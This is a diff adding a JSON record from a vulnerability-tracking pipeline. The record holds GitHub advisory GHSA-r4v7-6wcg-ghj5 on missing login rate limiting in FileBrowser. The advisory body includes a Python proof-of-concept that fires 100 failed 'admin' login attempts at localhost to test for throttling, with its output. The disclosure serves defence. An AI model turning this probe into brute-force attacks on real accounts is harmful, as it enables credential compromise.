@@ -1,0 +1,55 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/72583004?v=4\", \"events_url\": \"https://api.github.com/users/mdcoxe/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/mdcoxe/followers\", \"following_url\": \"https://api.github.com/users/mdcoxe/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/mdcoxe/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/mdcoxe\", \"id\": 72583004, \"login\": \"mdcoxe\", \"node_id\": \"MDQ6VXNlcjcyNTgzMDA0\", \"organizations_url\": \"https://api.github.com/users/mdcoxe/orgs\", \"received_events_url\": \"https://api.github.com/users/mdcoxe/received_events\", \"repos_url\": \"https://api.github.com/users/mdcoxe/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/mdcoxe/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/mdcoxe/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/mdcoxe\", \"user_view_type\": \"public\"}}], \"cve_id\": null, \"cvss\": {\"score\": 6.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 6.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-307\", \"name\": \"Improper Restriction of Excessive Authentication Attempts\"}], \"description\": \"### Summary\\nThe `/api/auth/login` endpoint does not implement rate limiting, account lockout, or progressive backoff for repeated authentication failures. As a result, an attacker can perform unlimited login attempts against the endpoint. When combined with the username enumeration timing vulnerability, valid accounts can be identified and then brute-forced without restriction. The risk is further increased by a weak default password policy that only enforces a minimum length of five characters.\\n\\n\\n### Details\\nThe authentication endpoint `/api/auth/login` does not enforce any form of rate limiting, account lockout, or progressive backoff for repeated failed login attempts. Testing confirmed that the endpoint accepts an unlimited number of authentication attempts from the same client without delay or restriction.\\n\\nThis allows attackers to repeatedly attempt password guesses against valid usernames.\\n\\nSecure authentication systems typically enforce request throttling, temporary account lockout, or progressive delays after repeated failed login attempts to mitigate brute-force attacks.\\n```\\n$ python rate-limit-probe.py\\n[*] Probing http://localhost/api/auth/login for rate limiting, lockout, and backoff behavior...\\n    Attempt  10: status=401, latency=0.0411s\\n    Attempt  20: status=401, latency=0.0411s\\n    Attempt  30: status=401, latency=0.0402s\\n    Attempt  40: status=401, latency=0.0420s\\n    Attempt  50: status=401, latency=0.0403s\\n    Attempt  60: status=401, latency=0.0423s\\n    Attempt  70: status=401, latency=0.0474s\\n    Attempt  80: status=401, latency=0.0417s\\n    Attempt  90: status=401, latency=0.0407s\\n    Attempt 100: status=401, latency=0.0407s\\n\\n--- CONCRETE EVIDENCE ---\\nAttempts completed:        100\\nTotal runtime:             4.17s\\nAverage request rate:      23.98 req/sec\\nUnique status codes:       [401]\\nAverage time (first 5):    0.0447s\\nAverage time (last 5):     0.0408s\\nLatency delta:             -0.0038s\\n[RESULT] No HTTP 429 responses observed.\\n[RESULT] No progressive backoff detected: response timing remained effectively constant.\\n```\\n#### Additional Context\\nPassword validation is implemented in `backend/database/storage/bolt/user.go` via `checkPassword()`, which only verifies that the supplied password length is greater than or equal to settings.Config.Auth.Methods.PasswordAuth.MinLength. In `backend/common/settings/auth.go`, the PasswordAuthConfig documents the default value of MinLength as 5. No additional complexity requirements, such as uppercase, lowercase, numeric, or special character checks, were identified in this code path.\\n\\n### PoC\\nThe script below demonstrates the lack of rate limiting by performing a high volume automated authentication test.  The script sends sequential login requests and monitors for HTTP 429 (Too Many Requests) status codes. \\n\\n```\\nimport requests\\nimport time\\nimport statistics\\n\\nURL = \\\"http://localhost/api/auth/login\\\"\\nUSERNAME = \\\"admin\\\"\\nPASSWORD = \\\"wrong-password\\\"\\nMAX_ATTEMPTS = 100\\nTIMEOUT = 10\\n\\nlatencies = []\\nstatuses = []\\n\\nprint(f\\\"[*] Probing {URL} for rate limiting, lockout, and backoff behavior...\\\")\\n\\nstart_total = time.time()\\n\\nfor i in range(1, MAX_ATTEMPTS + 1):\\n    start = time.perf_counter()\\n\\n    resp = requests.post(\\n        URL,\\n        params={\\\"username\\\": USERNAME, \\\"recaptcha\\\": \\\"\\\"},\\n        headers={\\\"X-Password\\\": PASSWORD},\\n        timeout=TIMEOUT\\n    )\\n\\n    duration = time.perf_counter() - start\\n    latencies.append(duration)\\n    statuses.append(resp.status_code)\\n\\n    if resp.status_code == 429:\\n        print(f\\\"[!] Rate limit detected at attempt {i} (HTTP 429)\\\")\\n        break\\n\\n    if i % 10 == 0:\\n        print(f\\\"    Attempt {i:3}: status={resp.status_code}, latency={duration:.4f}s\\\")\\n\\nend_total = time.time()\\nattempts_completed = len(latencies)\\n\\nprint(\\\"\\\\n--- CONCRETE EVIDENCE ---\\\")\\n\\nfirst_five_avg = statistics.mean(latencies[:5]) if attempts_completed >= 5 else statistics.mean(latencies)\\nlast_five_avg = statistics.mean(latencies[-5:]) if attempts_completed >= 5 else statistics.mean(latencies)\\nlatency_delta = last_five_avg - first_five_avg\\n\\nprint(f\\\"Attempts completed:        {attempts_completed}\\\")\\nprint(f\\\"Total runtime:             {end_total - start_total:.2f}s\\\")\\nprint(f\\\"Average request rate:      {attempts_completed / (end_total - start_total):.2f} req/sec\\\")\\nprint(f\\\"Unique status codes:       {sorted(set(statuses))}\\\")\\nprint(f\\\"Average time (first 5):    {first_five_avg:.4f}s\\\")\\nprint(f\\\"Average time (last 5):     {last_five_avg:.4f}s\\\")\\nprint(f\\\"Latency delta:             {latency_delta:+.4f}s\\\")\\n\\nif 429 not in statuses:\\n    print(\\\"[RESULT] No HTTP 429 responses observed.\\\")\\n\\nif abs(latency_delta) < 0.05:\\n    print(\\\"[RESULT] No progressive backoff detected: response timing remained effectively constant.\\\")\\nelse:\\n    print(\\\"[RESULT] Latency variation detected: investigate possible throttling or environmental noise.\\\")\\n```                                  \\n\\n### Impact\\nAn attacker can perform unlimited authentication attempts against valid usernames. When combined with the username enumeration timing vulnerability, this enables targeted brute-force attacks against user accounts and increases the likelihood of credential compromise.\\n\\n\\n\\nPlease let me know if you need any additional information or clarification.\\nI'm happy to assist with testing or validating a fix.\", \"ghsa_id\": \"GHSA-r4v7-6wcg-ghj5\", \"github_reviewed_at\": \"2026-06-25T18:18:12Z\", \"html_url\": \"https://github.com/advisories/GHSA-r4v7-6wcg-ghj5\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-r4v7-6wcg-ghj5\"}], \"nvd_published_at\": null, \"published_at\": \"2026-06-25T18:18:12Z\", \"references\": [\"https://github.com/gtsteffaniak/filebrowser/security/advisories/GHSA-r4v7-6wcg-ghj5\", \"https://github.com/gtsteffaniak/filebrowser/pull/2485\", \"https://github.com/gtsteffaniak/filebrowser/commit/fa5abc8c67f3a66ce76e358a3c57981750c76a23\", \"https://github.com/advisories/GHSA-r4v7-6wcg-ghj5\"], \"repository_advisory_url\": \"https://api.github.com/repos/gtsteffaniak/filebrowser/security-advisories/GHSA-r4v7-6wcg-ghj5\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/gtsteffaniak/filebrowser\", \"summary\": \"FileBrowser: Missing Rate Limiting on Authentication Endpoint Enables Brute Force Attacks\", \"type\": \"reviewed\", \"updated_at\": \"2026-06-25T18:18:13Z\", \"url\": \"https://api.github.com/advisories/GHSA-r4v7-6wcg-ghj5\", \"vulnerabilities\": [{\"first_patched_version\": \"0.0.0-20260522161427-fa5abc8c67f3a\", \"package\": {\"ecosystem\": \"go\", \"name\": \"github.com/gtsteffaniak/filebrowser\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 0.0.0-20260522161427-fa5abc8c67f3a\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-r4v7-6wcg-ghj5",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "github.com/gtsteffaniak/filebrowser: < 0.0.0-20260522161427-fa5abc8c67f3a"
+    ],
+    "authentication_required": false,
+    "cves": [],
+    "cvss_score": 6.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "github.com/gtsteffaniak/filebrowser"
+    ],
+    "remote": true,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-07-20T19:51:57.226594Z",
+  "provenance": {
+    "content_sha256": "2720f60bbfdfb8e637dc11338a8af64b122223a552780bdb9e7ae6770ebdfa7c",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-06-25T18:18:12Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-r4v7-6wcg-ghj5",
+  "status": "active",
+  "title": "FileBrowser: Missing Rate Limiting on Authentication Endpoint Enables Brute Force Attacks",
+  "updated_at": "2026-06-25T18:18:13Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-r4v7-6wcg-ghj5"
+}
